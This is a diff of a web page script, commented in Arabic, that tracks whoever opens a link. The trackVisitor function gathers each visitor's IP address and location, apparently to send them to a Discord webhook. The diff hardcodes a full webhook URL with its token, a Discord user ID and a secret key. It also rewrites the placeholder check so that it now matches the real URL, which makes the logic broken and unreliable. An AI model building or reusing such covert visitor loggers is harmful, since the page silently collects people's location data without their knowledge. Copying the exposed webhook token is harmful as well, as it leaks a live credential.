@@ -41,13 +41,13 @@
     <script>
         // --- إعداداتك الخاصة (عدلها هنا) ---
         const SECRET_KEY = "0615"; 
-        const DISCORD_WEBHOOK = "ضع_رابط_الويب_هوك_هنا"; 
-        const MY_DISCORD_ID = "ضع_الآيدي_حقك_هنا"; 
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1484341798720766273/tsbRq_cNzTIyAormTgLriD15N7PV6VAaqWsQWzCENTD_7tVQnQZRNMdO-1YRfScFA_SE"; 
+        const MY_DISCORD_ID = "1226978647295000627"; 
         // --------------------------------
 
         // 1. تعقب من فتح الرابط
         async function trackVisitor() {
-            if(!DISCORD_WEBHOOK || DISCORD_WEBHOOK.includes("ضع_رابط")) return;
+            if(!DISCORD_WEBHOOK || DISCORD_WEBHOOK.includes("https://discord.com/api/webhooks/1484341798720766273/tsbRq_cNzTIyAormTgLriD15N7PV6VAaqWsQWzCENTD_7tVQnQZRNMdO-1YRfScFA_SE")) return;
             
             let ip = "غير معروف";
             let loc = "غير معروف";
